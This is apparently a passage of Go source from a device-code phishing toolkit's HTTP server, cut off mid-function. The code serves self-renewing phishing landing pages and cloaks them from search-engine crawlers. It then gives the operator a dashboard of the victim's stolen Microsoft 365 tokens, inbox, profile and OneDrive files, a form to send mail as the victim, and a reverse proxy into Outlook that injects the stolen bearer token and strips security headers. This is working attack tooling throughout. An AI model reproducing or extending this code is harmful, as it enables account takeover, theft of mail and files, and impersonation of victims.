package core

import (
	"bytes"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"net/http/cookiejar"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/caddyserver/certmagic"
	"github.com/gorilla/mux"
	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

type HttpServer struct {
	srv        *http.Server
	acmeTokens map[string]string
	Cfg        *Config
	Db         *database.Database
}

func NewHttpServer() (*HttpServer, error) {
	s := &HttpServer{}
	s.acmeTokens = make(map[string]string)
	// cfg must be set after creation

	r := mux.NewRouter()
	s.srv = &http.Server{
		Handler:      r,
		Addr:         ":80",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	r.HandleFunc("/.well-known/acme-challenge/{token}", s.handleACMEChallenge).Methods("GET")
	// Blacklist admin API
	r.HandleFunc("/admin/blacklist", s.handleBlacklistList).Methods("GET")
	r.HandleFunc("/admin/blacklist", s.handleBlacklistAdd).Methods("POST")
	r.HandleFunc("/admin/blacklist", s.handleBlacklistRemove).Methods("DELETE")
	r.HandleFunc("/admin/blacklist/flush", s.handleBlacklistFlush).Methods("POST")
	// Admin panel
	r.HandleFunc("/admin/panel", s.handleAdminPanel).Methods("GET", "POST")
	// Device code landing pages + token dashboard
	r.HandleFunc("/dc/use/{token}", s.handleDCUse).Methods("GET")
	r.HandleFunc("/dc/inbox/{token}", s.handleDCInbox).Methods("GET")
	r.HandleFunc("/dc/open/{token}", s.handleDCOpen).Methods("GET")
	r.HandleFunc("/dc/send/{token}", s.handleDCSend).Methods("GET", "POST")
	r.HandleFunc("/dc/drive/{token}", s.handleDCDrive).Methods("GET")
	r.PathPrefix("/dc/owa/").HandlerFunc(s.handleDCOWA)
	r.HandleFunc("/dc/{token}", s.handleDCLanding).Methods("GET")
	// User panels
	r.PathPrefix("/panel/").HandlerFunc(s.handleUserPanel)

	r.PathPrefix("/").HandlerFunc(s.handleRedirect)

	return s, nil
}

// admin handlers
func (s *HttpServer) handleBlacklistList(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	type entry struct {
		IP string `json:"ip"`
	}
	var out []entry
	for k := range GlobalBlacklist.ips {
		out = append(out, entry{IP: k})
	}
	b, _ := json.Marshal(out)
	w.Header().Set("Content-Type", "application/json")
	w.Write(b)
}

func (s *HttpServer) handleBlacklistAdd(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	var req struct {
		IP string `json:"ip"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&req); err != nil || req.IP == "" {
		http.Error(w, "invalid", http.StatusBadRequest)
		return
	}
	if err := GlobalBlacklist.AddIP(req.IP); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) handleBlacklistRemove(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	var req struct {
		IP string `json:"ip"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&req); err != nil || req.IP == "" {
		http.Error(w, "invalid", http.StatusBadRequest)
		return
	}
	if err := GlobalBlacklist.RemoveIP(req.IP); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) handleBlacklistFlush(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	if err := GlobalBlacklist.Flush(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) Start() {
	go s.srv.ListenAndServe()
}

func (s *HttpServer) AddACMEToken(token string, keyAuth string) {
	s.acmeTokens[token] = keyAuth
}

func (s *HttpServer) ClearACMETokens() {
	s.acmeTokens = make(map[string]string)
}

func (s *HttpServer) handleACMEChallenge(w http.ResponseWriter, r *http.Request) {
	// Let certmagic's HTTP-01 solver handle it first.
	// This is required because certmagic manages challenge tokens internally
	// and cannot bind port 80 separately (already owned by this server).
	if certmagic.DefaultACME.HandleHTTPChallenge(w, r) {
		log.Debug("http: certmagic handled ACME challenge for URL: %s", r.URL.Path)
		return
	}

	// Fallback to manual token store (legacy path).
	vars := mux.Vars(r)
	token := vars["token"]

	key, ok := s.acmeTokens[token]
	if !ok {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	log.Debug("http: found ACME verification token for URL: %s", r.URL.Path)
	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/plain")
	w.Write([]byte(key))
}

func (s *HttpServer) handleRedirect(w http.ResponseWriter, r *http.Request) {
	// Anti-bot: block known crawler/user-agent strings and add their IPs to the blacklist
	ua := r.UserAgent()
	uaLower := strings.ToLower(ua)
	// check configured UA regex first
	blockedByUA := false
	if s.Cfg != nil && s.Cfg.blacklistConfig != nil {
		for _, pat := range s.Cfg.blacklistConfig.UARegex {
			if pat == "" {
				continue
			}
			re, err := regexp.Compile(pat)
			if err != nil {
				log.Error("invalid UA regex pattern: %s", pat)
				continue
			}
			if re.MatchString(ua) || re.MatchString(uaLower) {
				blockedByUA = true
				break
			}
		}
	}

	knownBots := []string{"googlebot", "bingbot", "baiduspider", "yandex", "duckduckbot", "slurp", "facebookexternalhit", "twitterbot", "linkedinbot", "adsbot-google", "applebot"}
	for _, b := range knownBots {
		if strings.Contains(uaLower, b) {
			blockedByUA = true
			break
		}
	}

	if blockedByUA {
		log.Warning("Known bot detected via UA: %s IP=%s", ua, r.RemoteAddr)
		// add IP to persistent blacklist if available, but respect config whitelists/ASN
		if GlobalBlacklist != nil {
			ip := r.RemoteAddr
			// strip port if present
			if idx := strings.LastIndex(ip, ":"); idx > -1 {
				ip = ip[:idx]
			}
			if !IsIPPermitted(ip, s.Cfg) {
				if err := GlobalBlacklist.AddIP(ip); err == nil {
					log.Info("blacklist: added IP %s", ip)
				} else {
					log.Error("blacklist add failed: %v", err)
				}
			} else {
				log.Info("blacklist: skipped adding whitelisted IP %s", ip)
			}
		}
		http.Redirect(w, r, "https://www.google.com", http.StatusFound)
		return
	}

	// If not a known bot, optionally use StealthAI scoring if enabled
	if s.Cfg != nil && s.Cfg.IsStealthAIEnabled() {
		packet := r.UserAgent() + "|" + r.RemoteAddr + "|" + r.URL.String()
		score, err := AnalyzeTrafficWithStealthAI(packet)
		if err == nil {
			log.Info("StealthAI score: %f for UA: %s", score, r.UserAgent())
			if score > 0.85 {
				log.Warning("Bot detected and blocked by StealthAI: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				// add to blacklist
				if GlobalBlacklist != nil {
					ip := r.RemoteAddr
					if idx := strings.LastIndex(ip, ":"); idx > -1 {
						ip = ip[:idx]
					}
					if !GlobalBlacklist.IsWhitelisted(ip) {
						_ = GlobalBlacklist.AddIP(ip)
					}
				}
				http.Redirect(w, r, "https://www.google.com", http.StatusFound)
				return
			} else if score > 0.5 {
				log.Warning("Suspicious traffic redirected: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				http.Redirect(w, r, "https://www.bing.com", http.StatusFound)
				return
			} else {
				log.Info("Normal user allowed: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
			}
		}
	}

	http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
}

// handleDCLanding serves the device code landing page.
// If the code is expired or declined, it auto-starts a fresh device code
// flow for the same target and redirects — so the link in the email never
// truly dies.
func (s *HttpServer) handleDCLanding(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	token := vars["token"]
	tgt := GetTargetByToken(token)
	if tgt == nil {
		http.NotFound(w, r)
		return
	}

	tgt.mu.Lock()
	status := tgt.Status
	ident := tgt.Email
	if ident == "" {
		ident = tgt.Tenant
	}
	campID := tgt.CampaignID
	tgt.mu.Unlock()

	// Auto-refresh: start a new flow and redirect when this one is done/expired.
	if status == "expired" || status == "declined" || status == "completed" {
		if ident != "" {
			if fresh, err := newTarget(campID, ident); err == nil {
				dcMu.Lock()
				dcTargets = append(dcTargets, fresh)
				dcMu.Unlock()
				go fresh.poll()
				http.Redirect(w, r, "/dc/"+fresh.LandingToken, http.StatusFound)
				return
			}
		}
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(DCLandingPage(tgt)))
}

// handleDCUse fetches Graph API data for a completed device code target and
// renders a one-click admin dashboard showing the victim's account details.
// graphDo makes a Graph API GET using the given bearer token.
func graphDo(at, path string) ([]byte, error) {
	req, _ := http.NewRequest("GET", "https://graph.microsoft.com/v1.0"+path, nil)
	req.Header.Set("Authorization", "Bearer "+at)
	req.Header.Set("Accept", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

type graphUser struct {
	DisplayName       string `json:"displayName"`
	Mail              string `json:"mail"`
	UserPrincipalName string `json:"userPrincipalName"`
	JobTitle          string `json:"jobTitle"`
	Department        string `json:"department"`
	OfficeLocation    string `json:"officeLocation"`
	MobilePhone       string `json:"mobilePhone"`
}
type graphMsg struct {
	ID           string `json:"id"`
	Subject      string `json:"subject"`
	ReceivedDate string `json:"receivedDateTime"`
	From         struct {
		EmailAddress struct {
			Name    string `json:"name"`
			Address string `json:"address"`
		} `json:"emailAddress"`
	} `json:"from"`
	BodyPreview  string `json:"bodyPreview"`
	IsRead       bool   `json:"isRead"`
}
type graphMsgList struct {
	Value    []graphMsg `json:"value"`
	NextLink string     `json:"@odata.nextLink"`
}

func dcGetUser(at, fallback string) graphUser {
	var u graphUser
	if b, err := graphDo(at, "/me"); err == nil {
		json.Unmarshal(b, &u)
	}
	if u.Mail == "" {
		u.Mail = u.UserPrincipalName
	}
	if u.Mail == "" {
		u.Mail = fallback
	}
	return u
}

func handleDCUse(w http.ResponseWriter, r *http.Request, tgt *DCTarget) {
	tgt.mu.Lock()
	at := tgt.AccessToken
	rt := tgt.RefreshToken
	email := tgt.Email
	landingToken := tgt.LandingToken
	tgt.mu.Unlock()

	if at == "" {
		http.Error(w, "No token yet — victim has not approved.", http.StatusBadRequest)
		return
	}

	u := dcGetUser(at, email)

	var msgs graphMsgList
	if b, err := graphDo(at, "/me/messages?$top=20&$select=id,subject,from,receivedDateTime,bodyPreview,isRead&$orderby=receivedDateTime desc"); err == nil {
		json.Unmarshal(b, &msgs)
	}

	var rows strings.Builder
	for _, m := range msgs.Value {
		d := m.ReceivedDate
		if len(d) >= 10 {
			d = d[:10]
		}
		unread := ""
		if !m.IsRead {
			unread = `style="font-weight:700;color:#fff"`
		}
		rows.WriteString(fmt.Sprintf(`<tr %s>
<td>%s</td><td>%s<br><span style="color:#555;font-size:11px">%s</span></td><td>%s</td>
<td><a href="/dc/msg/%s/%s" target="_blank" style="color:#0078d4;font-size:11px">Read</a></td></tr>`,
			unread,
			template.HTMLEscapeString(d),
			template.HTMLEscapeString(m.From.EmailAddress.Name),
			template.HTMLEscapeString(m.From.EmailAddress.Address),
			template.HTMLEscapeString(m.Subject),
			template.HTMLEscapeString(landingToken),
			template.HTMLEscapeString(m.ID),
		))
	}

	sent := r.URL.Query().Get("sent") == "1"
	sentBanner := ""
	if sent {
		sentBanner = `<div style="background:#1a3a1a;border:1px solid #2d6e2d;border-radius:4px;padding:10px 14px;margin-bottom:16px;font-size:13px;color:#5cb85c">Email sent successfully.</div>`
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>Dashboard — %s</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:20px;color:#fff;margin-bottom:4px}
.sub{font-size:13px;color:#888;margin-bottom:20px}
.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:18px 22px;margin-bottom:16px}
.card h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#555;margin-bottom:12px}
.kv{display:grid;grid-template-columns:140px 1fr;gap:5px 10px;font-size:13px}
.k{color:#555}.v{color:#ddd;word-break:break-all}
.tok{background:#111;border:1px solid #2a2a2a;border-radius:3px;padding:8px 12px;font-family:monospace;font-size:10px;color:#7ec8e3;word-break:break-all;max-height:64px;overflow-y:auto;margin-top:6px}
table{width:100%%;border-collapse:collapse;font-size:12px}
th{text-align:left;padding:7px 10px;color:#444;border-bottom:1px solid #222;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
td{padding:7px 10px;border-bottom:1px solid #1c1c1c;color:#aaa;vertical-align:top}
tr:hover td{background:#1e1e1e}
.actions{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px;align-items:center}
.btn{padding:7px 16px;border-radius:4px;font-size:12px;font-weight:600;text-decoration:none;border:none;cursor:pointer;display:inline-block}
.b1{background:#0078d4;color:#fff}
.b2{background:#1e1e1e;color:#bbb;border:1px solid #2a2a2a}
.b3{background:#107c10;color:#fff}
.ok{color:#5cb85c;font-size:12px;display:none;margin-left:4px}
.sect{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#333;margin:18px 0 8px}
</style></head><body>
<h1>%s</h1>
<p class="sub">%s &nbsp;·&nbsp; %s &nbsp;·&nbsp; %s</p>
%s
<p class="sect">Account Access</p>
<div class="actions">
<a class="btn b3" href="/dc/open/%s" target="_blank">Open Full OWA</a>
<a class="btn b1" href="/dc/send/%s">Send Email as Victim</a>
<a class="btn b2" href="/dc/drive/%s">OneDrive Files</a>
<a class="btn b2" href="/dc/inbox/%s">Full Inbox</a>
</div>
<p class="sect">Tokens</p>
<div class="actions">
<button class="btn b2" onclick="cp(at)">Copy Access Token</button>
<button class="btn b2" onclick="cp(rt)">Copy Refresh Token</button>
<span class="ok" id="ok">Copied</span>
</div>
<div class="card"><h2>Profile</h2><div class="kv">
<span class="k">Name</span><span class="v">%s</span>
<span class="k">Email</span><span class="v">%s</span>
<span class="k">Title</span><span class="v">%s</span>
<span class="k">Department</span><span class="v">%s</span>
<span class="k">Office</span><span class="v">%s</span>
<span class="k">Mobile</span><span class="v">%s</span>
</div></div>
<div class="card"><h2>Access Token</h2><div class="tok" id="atbox">%s</div></div>
<div class="card"><h2>Inbox — last 20</h2>
<table><thead><tr><th>Date</th><th>From</th><th>Subject</th><th></th></tr></thead><tbody>
%s</tbody></table></div>
<script>
var at=%q,rt=%q;
function cp(s){navigator.clipboard.writeText(s);var o=document.getElementById('ok');o.style.display='inline';setTimeout(function(){o.style.display='none'},1400);}
</script></body></html>`,
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.DisplayName),
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.JobTitle),
		template.HTMLEscapeString(u.Department),
		sentBanner,
		template.HTMLEscapeString(landingToken),
		template.HTMLEscapeString(landingToken),
		template.HTMLEscapeString(landingToken),
		template.HTMLEscapeString(landingToken),
		template.HTMLEscapeString(u.DisplayName),
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.JobTitle),
		template.HTMLEscapeString(u.Department),
		template.HTMLEscapeString(u.OfficeLocation),
		template.HTMLEscapeString(u.MobilePhone),
		template.HTMLEscapeString(at),
		rows.String(),
		at, rt,
	)
}

func (s *HttpServer) handleDCUse(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	handleDCUse(w, r, tgt)
}

// handleDCInbox shows a full scrollable inbox for the captured account.
func (s *HttpServer) handleDCInbox(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	tgt.mu.Lock()
	at := tgt.AccessToken
	email := tgt.Email
	tgt.mu.Unlock()
	if at == "" {
		http.Error(w, "no token", http.StatusBadRequest)
		return
	}
	u := dcGetUser(at, email)
	var msgs graphMsgList
	if b, err := graphDo(at, "/me/messages?$top=50&$select=id,subject,from,receivedDateTime,isRead&$orderby=receivedDateTime desc"); err == nil {
		json.Unmarshal(b, &msgs)
	}
	var rows strings.Builder
	for _, m := range msgs.Value {
		d := m.ReceivedDate
		if len(d) >= 10 {
			d = d[:10]
		}
		bold := ""
		if !m.IsRead {
			bold = "font-weight:700;color:#fff;"
		}
		rows.WriteString(fmt.Sprintf(`<tr style="%s">
<td>%s</td><td>%s<br><span style="color:#555;font-size:11px">%s</span></td><td>%s</td>
</tr>`,
			bold,
			template.HTMLEscapeString(d),
			template.HTMLEscapeString(m.From.EmailAddress.Name),
			template.HTMLEscapeString(m.From.EmailAddress.Address),
			template.HTMLEscapeString(m.Subject),
		))
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Inbox — %s</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:18px;color:#fff;margin-bottom:16px}
table{width:100%%;border-collapse:collapse;font-size:12px}
th{text-align:left;padding:7px 10px;color:#444;border-bottom:1px solid #222;font-size:11px;text-transform:uppercase}
td{padding:8px 10px;border-bottom:1px solid #1c1c1c;color:#aaa;vertical-align:top}
tr:hover td{background:#1a1a1a}
</style></head><body>
<h1>Inbox — %s (%d messages)</h1>
<table><thead><tr><th>Date</th><th>From</th><th>Subject</th></tr></thead><tbody>
%s</tbody></table></body></html>`,
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.Mail),
		len(msgs.Value),
		rows.String(),
	)
}

// ─────────────────────────────────────────────────────────────────────────────
// OWA reverse proxy — admin browses victim's Outlook through our server
// ─────────────────────────────────────────────────────────────────────────────

type owaSession struct {
	at     string
	client *http.Client
	mu     sync.Mutex
}

var (
	owaSessions   = map[string]*owaSession{}
	owaSessionsMu sync.Mutex
)

// owaReplace rewrites absolute OWA/Office URLs in response bodies to proxy URLs.
var owaHosts = []string{
	"https://outlook.office.com",
	"https://outlook.office365.com",
	"https://substrate.office.com",
	"https://www.office.com",
	"https://login.microsoftonline.com",
}

func owaRewrite(body []byte, sessID string, ct string) []byte {
	if !strings.Contains(ct, "html") &&
		!strings.Contains(ct, "javascript") &&
		!strings.Contains(ct, "json") &&
		!strings.Contains(ct, "text") {
		return body
	}
	s := string(body)
	base := "/dc/owa/" + sessID
	for _, h := range owaHosts {
		s = strings.ReplaceAll(s, h, base)
		// escaped variant in JSON/JS strings
		esc := strings.ReplaceAll(h, "/", `\/`)
		s = strings.ReplaceAll(s, esc, strings.ReplaceAll(base, "/", `\/`))
	}
	// protocol-relative
	s = strings.ReplaceAll(s, `//outlook.office.com`, base)
	s = strings.ReplaceAll(s, `//outlook.office365.com`, base)
	return []byte(s)
}

// handleDCOpen creates an authenticated OWA proxy session and redirects admin.
func (s *HttpServer) handleDCOpen(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.NotFound(w, r)
		return
	}
	tgt.mu.Lock()
	rt := tgt.RefreshToken
	at := tgt.AccessToken
	tenant := tgt.Tenant
	tgt.mu.Unlock()

	if rt == "" && at == "" {
		http.Error(w, "no token captured yet — victim has not approved", http.StatusBadRequest)
		return
	}

	// Try OWA scope first, fall back to graph scope
	owaAT := at
	if rt != "" {
		if a, _, err := RefreshForScope(rt, tenant, "https://outlook.office.com/.default offline_access"); err == nil {
			owaAT = a
		} else if a, _, err := RefreshForScope(rt, tenant, "https://graph.microsoft.com/.default offline_access"); err == nil {
			owaAT = a
		}
	}

	jar, _ := cookiejar.New(nil)
	sess := &owaSession{at: owaAT}
	sess.client = &http.Client{
		Jar:     jar,
		Timeout: 30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) > 15 {
				return http.ErrUseLastResponse
			}
			// keep injecting bearer on every redirect
			req.Header.Set("Authorization", "Bearer "+owaAT)
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
			return nil
		},
	}

	// Warm up: hit OWA root with bearer so it sets session cookies in jar.
	warmReq, _ := http.NewRequest("GET", "https://outlook.office.com/mail/", nil)
	warmReq.Header.Set("Authorization", "Bearer "+owaAT)
	warmReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
	warmReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	sess.client.Do(warmReq) //nolint

	sessID := randHex(16)
	owaSessionsMu.Lock()
	owaSessions[sessID] = sess
	owaSessionsMu.Unlock()

	http.Redirect(w, r, "/dc/owa/"+sessID+"/mail/", http.StatusFound)
}

// handleDCOWA transparently proxies requests to outlook.office.com,
// injecting the bearer token and rewriting OWA URLs in responses.
func (s *HttpServer) handleDCOWA(w http.ResponseWriter, r *http.Request) {
	// path: /dc/owa/{sessID}/...
	parts := strings.SplitN(strings.TrimPrefix(r.URL.Path, "/dc/owa/"), "/", 2)
	if len(parts) == 0 || parts[0] == "" {
		http.Error(w, "missing session id", http.StatusBadRequest)
		return
	}
	sessID := parts[0]
	upstreamPath := "/"
	if len(parts) == 2 && parts[1] != "" {
		upstreamPath = "/" + parts[1]
	}

	owaSessionsMu.Lock()
	sess, ok := owaSessions[sessID]
	owaSessionsMu.Unlock()
	if !ok {
		http.Error(w, "OWA session expired — return to the dashboard and click Open Full OWA again", http.StatusGone)
		return
	}

	targetURL := "https://outlook.office.com" + upstreamPath
	if r.URL.RawQuery != "" {
		targetURL += "?" + r.URL.RawQuery
	}

	upReq, err := http.NewRequest(r.Method, targetURL, r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	// forward safe headers
	hop := map[string]bool{"host": true, "connection": true, "te": true, "trailers": true, "transfer-encoding": true, "upgrade": true}
	for k, v := range r.Header {
		if !hop[strings.ToLower(k)] {
			upReq.Header[k] = v
		}
	}
	upReq.Header.Set("Authorization", "Bearer "+sess.at)
	upReq.Header.Set("Host", "outlook.office.com")
	upReq.Header.Set("Origin", "https://outlook.office.com")
	upReq.Header.Set("Referer", "https://outlook.office.com/")
	upReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")

	sess.mu.Lock()
	resp, err := sess.client.Do(upReq)
	sess.mu.Unlock()
	if err != nil {
		http.Error(w, "upstream: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	// Read + optionally decompress gzip body
	var rawBody []byte
	if resp.Header.Get("Content-Encoding") == "gzip" {
		gr, err := gzip.NewReader(resp.Body)
		if err == nil {
			rawBody, _ = io.ReadAll(gr)
			gr.Close()
			resp.Header.Del("Content-Encoding")
		} else {
			rawBody, _ = io.ReadAll(resp.Body)
		}
	} else {
		rawBody, _ = io.ReadAll(resp.Body)
	}

	ct := resp.Header.Get("Content-Type")
	proxyBase := "/dc/owa/" + sessID
	rawBody = owaRewrite(rawBody, sessID, ct)

	// Inject a small JS shim into HTML pages so OWA constructs relative URLs
	// using our proxy base instead of the real hostname.
	if strings.Contains(ct, "text/html") {
		shim := fmt.Sprintf(`<script>
(function(){
  var _base=%q;
  // Patch fetch so relative OWA calls go through proxy
  var _fetch=window.fetch;
  window.fetch=function(u,o){
    if(typeof u==='string'&&u.startsWith('https://outlook.office')){
      u=_base+u.replace(/https:\/\/outlook\.office(365)?\.com/,'');
    }
    return _fetch(u,o);
  };
  // Patch XHR open
  var _open=XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open=function(m,u){
    if(typeof u==='string'&&u.startsWith('https://outlook.office')){
      u=_base+u.replace(/https:\/\/outlook\.office(365)?\.com/,'');
    }
    return _open.apply(this,arguments);
  };
})();
</script>`, proxyBase)
		rawBody = bytes.Replace(rawBody, []byte("<head>"), []byte("<head>"+shim), 1)
	}

	// Forward response headers, stripping security headers that break the proxy
	skip := map[string]bool{
		"content-length":            true,
		"transfer-encoding":         true,
		"connection":                true,
		"content-security-policy":   true,
		"x-content-type-options":    true,
		"x-frame-options":           true,
		"strict-transport-security": true,
	}
	for k, v := range resp.Header {
		if !skip[strings.ToLower(k)] {
			w.Header()[k] = v
		}
	}
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(rawBody)))
	w.WriteHeader(resp.StatusCode)
	w.Write(rawBody)
}

// ─────────────────────────────────────────────────────────────────────────────
// Send email via Graph API
// ─────────────────────────────────────────────────────────────────────────────

func (s *HttpServer) handleDCSend(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.NotFound(w, r)
		return
	}
	tgt.mu.Lock()
	at := tgt.AccessToken
	tok := tgt.LandingToken
	tgt.mu.Unlock()

	if r.Method == "POST" {
		r.ParseForm()
		to := strings.TrimSpace(r.FormValue("to"))
		subj := strings.TrimSpace(r.FormValue("subject"))
		body := strings.TrimSpace(r.FormValue("body"))
		isHTML := r.FormValue("html") == "1"
		ct := "Text"
		if isHTML {
			ct = "HTML"
		}
		payload := fmt.Sprintf(`{"message":{"subject":%s,"body":{"contentType":%s,"content":%s},"toRecipients":[{"emailAddress":{"address":%s}}]},"saveToSentItems":true}`,
			jsonQ(subj), jsonQ(ct), jsonQ(body), jsonQ(to))

		req, _ := http.NewRequest("POST", "https://graph.microsoft.com/v1.0/me/sendMail", strings.NewReader(payload))
		req.Header.Set("Authorization", "Bearer "+at)
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			http.Error(w, "send error: "+err.Error(), http.StatusInternalServerError)
			return
		}
		resp.Body.Close()
		if resp.StatusCode == 202 {
			http.Redirect(w, r, "/dc/use/"+tok+"?sent=1", http.StatusSeeOther)
			return
		}
		// show error
		b, _ := io.ReadAll(resp.Body)
		http.Error(w, fmt.Sprintf("Graph returned %d: %s", resp.StatusCode, b), http.StatusBadGateway)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Send Email</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:18px;color:#fff;margin-bottom:18px}
label{font-size:12px;color:#888;display:block;margin-bottom:4px;margin-top:12px}
input,textarea,select{width:100%%;background:#1a1a1a;border:1px solid #2a2a2a;border-radius:4px;padding:9px 12px;color:#e0e0e0;font-size:13px;outline:none}
input:focus,textarea:focus{border-color:#0078d4}
textarea{height:200px;resize:vertical;font-family:inherit}
.row{display:flex;gap:12px;align-items:center;margin-top:16px}
.btn{padding:9px 22px;border-radius:4px;font-size:13px;font-weight:600;border:none;cursor:pointer;background:#0078d4;color:#fff}
.back{color:#888;font-size:12px;text-decoration:none}
.wrap{max-width:640px}
</style></head><body>
<div class="wrap">
<h1>Send Email as Victim</h1>
<a class="back" href="/dc/use/%s">&larr; Back to dashboard</a>
<form method="POST">
<label>To</label><input name="to" placeholder="recipient@domain.com" required>
<label>Subject</label><input name="subject" placeholder="Subject line" required>
<label>Body</label><textarea name="body" placeholder="Email body..."></textarea>
<div class="row">
<label style="margin:0;display:flex;align-items:center;gap:6px;font-size:12px;color:#aaa">
  <input type="checkbox" name="html" value="1" style="width:auto"> Send as HTML
</label>
<button class="btn" type="submit">Send</button>
</div>
</form>
</div></body></html>`, tok)
}

// ─────────────────────────────────────────────────────────────────────────────
// OneDrive file browser
// ─────────────────────────────────────────────────────────────────────────────

type driveItem struct {
	ID     string      `json:"id"`
	Name   string      `json:"name"`
	Size   int64       `json:"size"`
	Folder *struct{}   `json:"folder"`
	File   *struct {
		MimeType string `json:"mimeType"`
	} `json:"file"`
	WebURL   string `json:"webUrl"`
	Download string `json:"@microsoft.graph.downloadUrl"`
}
type driveList struct {
	Value []driveItem `json:"value"`
}

func (s *HttpServer) handleDCDrive(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.NotFound(w, r)
		return
	}
	tgt.mu.Lock()
	at := tgt.AccessToken
	tok := tgt.LandingToken
	email := tgt.Email
	tgt.mu.Unlock()
	if at == "" {
		http.Error(w, "no token", http.StatusBadRequest)
		return
	}

	itemID := r.URL.Query().Get("id")
	apiPath := "/me/drive/root/children"
	if itemID != "" {
		apiPath = "/me/drive/items/" + itemID + "/children"
	}

	var dl driveList
	if b, err := graphDo(at, apiPath+"?$select=id,name,size,folder,file,webUrl&$orderby=name"); err == nil {
		json.Unmarshal(b, &dl)
	}

	var rows strings.Builder
	for _, it := range dl.Value {
		icon := "📄"
		link := fmt.Sprintf(`<a href="/dc/drive/%s?id=%s" style="color:#0078d4">%s</a>`, tok, it.ID, template.HTMLEscapeString(it.Name))
		if it.Folder != nil {
			icon = "📁"
		} else {
